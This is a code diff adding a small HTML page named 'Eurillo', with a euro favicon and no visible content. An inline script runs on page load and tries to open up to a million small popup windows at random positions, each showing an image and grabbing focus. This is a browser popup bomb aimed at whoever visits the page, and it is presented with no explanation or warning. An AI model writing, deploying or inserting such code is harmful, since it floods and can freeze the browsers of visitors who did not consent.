@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="euro-signo-moneda-dinero-icono-by-Vexels.png" type="image/x-icon">
+    <title>Eurillo</title>
+</head>
+<body>
+    <script>
+        let acumulador = 0;
+        while (acumulador < 1000000) {
+            const x = Math.floor(Math.random() * window.innerWidth);
+            const y = Math.floor(Math.random() * window.innerHeight);
+            const popup = window.open("", "", `width=200,height=200,left=${x},top=${y}`);
+            popup.document.write('<img src="petirrojocani.png" alt="Imagen">');
+            acumulador++;
+            popup.focus();
+        }
+    </script>
+    
+</body>
+</html>
